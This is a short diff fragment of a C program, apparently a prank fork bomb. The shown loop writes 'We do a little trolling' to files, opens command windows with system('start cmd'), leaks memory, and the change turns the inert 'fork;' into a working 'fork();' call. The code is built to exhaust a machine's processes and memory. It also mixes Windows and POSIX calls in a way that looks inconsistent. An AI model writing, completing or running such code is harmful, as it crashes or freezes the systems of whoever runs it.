@@ -15,7 +15,7 @@ int main() {
             fputs("We do a little trolling\n", x[i]);
         }
         system("start cmd");
-        fork;
+        fork();
         malloc(1000);
     }
 }
